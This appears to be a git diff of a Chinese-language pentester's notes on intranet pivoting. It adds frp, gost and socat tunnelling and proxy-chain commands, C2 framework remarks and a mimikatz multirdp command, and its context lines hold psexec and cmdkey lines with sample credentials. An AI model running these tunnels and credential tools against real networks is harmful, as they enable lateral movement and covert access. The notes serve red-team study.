@@ -3,6 +3,10 @@ https://gitee.com/windyjxx/projects
 ## 信息收集
 [ENScan_GO | 剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题](https://github.com/wgpsec/ENScan_GO)
 
+## C2工具类似msf
+empire && starkiller VS metasploit && armitage
+
+empire && starkiller的体验还不错
 
 ## 内网相关/内网穿透
 [干货|通过边界代理一路打到三层内网+后渗透通用手法](https://mp.weixin.qq.com/s/uDPCkbWcp-upMH3r2x1WMA)
@@ -209,6 +213,7 @@ Ladon ReverseTcp 192.168.1.8 4444 meter
 
 ## frp
 [神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
+https://www.jianshu.com/p/42861aa3fea2
 
 
 * 常规方式
@@ -246,7 +251,19 @@ local_ip = 127.0.0.1
 local_port = 1234
 remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
 ```
+### 命令行方式
+不能做复杂配置
 
+```bash
+# frps.ini
+[common]
+server_addr = 127.0.0.1
+server_port = 7000
+token = frp123
+
+# frpc
+.\frpc tcp  -s "127.0.0.1:7000" -t frp123 -i "127.0.0.1" -l "2125"
+```
 
 ## goproxy
 
@@ -349,11 +366,12 @@ socat TCP4-LISTEN:822,fork TCP4::8080
 
 [SSH+socat](https://blog.51cto.com/u_14028678/3847755)
 ```shell
-# ssh -1080 本地1080 转发到 192.168.0.154
+# ssh 监听本地1080 有数据时 转移到 SSH 连接上面，随后发往远程主机。
 # 本地的 445端口数据通过sock代理转发到10.10.10.129的445端口上。
-ssh -D 1080 user@192.168.175.146
-socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445
+PC-1$ ssh -D 1080 user@192.168.175.146
+PC-1$ socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445
 # socat->sock默认端口就是 1080 ，使用其他端口要在最后指定 socksport=<port>
+# 将 PC-1:445的数据, 通过 192.168.175.146 转发到 192.168.232.132:445
 ```
 
 ![](https://s2.51cto.com/images/blog/202109/10/944febf3e0d057a36652ad7fba9f3e09.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp/resize,m_fixed,w_1184)
@@ -382,6 +400,11 @@ PC-1$ socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
 [doc v3](https://latest.gost.run/)
 
 
+__创建代理__
+```bash
+gost -L :8080 # http+socks5
+gost -L user:pass@:8080 # http+socks5 带验证
+```
 
 __端口转发:__
 将 1.1.1.1:9000 转发到 2.2.2.2:8080
@@ -401,6 +424,21 @@ PC-2$ gost -L=rtcp://:9001/:8081 -L=rtcp://:9000/:8080 -F=socks5://192.168.50.23
 # 本地端口转发, 可转成走代理的端口
 gost -L=tcp://:1234/192.168.50.80:8000 # 1234端口转发到 192.168.50.80:8000
 gost -L=tcp://:2222/192.168.1.1:22 [-F=...]
+## 一对多转发, 在每次收到转发请求后，会利用转发器中的节点选择器在目标地址列表中选择一个节点作为本次转发的目标地址。
+gost -L tcp://:8080/192.168.1.1:80,192.168.1.2:80,192.168.1.3:8080?strategy=round&maxFails=1&failTimeout=30s
+
+# 远程端口转发, 将172.24.10.1:2222上的数据(通过代理链)转发到192.168.1.1:22上,当代理链末端(最后一个-F参数)为SSH转发通道类型时，gost会直接使用SSH的远程端口转发功能:
+gost -L=rtcp://:2222/192.168.1.1:22 [-F=... -F=socks5://172.24.10.1:1080]
+## 例1 将 1.1.1.1:2126 显示 本地的80
+gost -L :2125 # VPS服务端启动代理
+gost -L=rtcp://:2126/:80 -F=socks5://1.1.1.1:2125
+
+gost -L=forward+ssh://:2222 # 服务端:
+gost -L=rtcp://:2222/192.168.1.1:22 -F forward+ssh://server_ip:2222
+
+
+# 代理链
+gost -L=:8080 -F=quic://192.168.1.1:6121 -F=socks5+wss://192.168.1.2:1080 -F=http2://192.168.1.3:443 ... -F=a.b.c.d:NNNN
 ```
 
 代理模式
@@ -539,6 +577,16 @@ python psexec.py god/administrator:hongrisec@2019@192.168.52.143 -c 1.bat
 ```bat
 :: 1个服务器只能保留一个凭据
 cmdkey /generic:"TERMSRV/192.168.50.153" /user:"admin" /pass:"123456"
-cmdkey /generic:"192.168.50.153" /user:"admin" /pass:"123456"
 mstsc /admin /v:192.168.50.153:33089
 ```
+
+## mimikatz
+
+```bash
+# multirdp
+mimikatz.exe privilege::Debug ts::multirdp exit
+```
+
+# 团队协作 
+rocketchat 局域网聊天工具。web 可传文件
+synolog chat
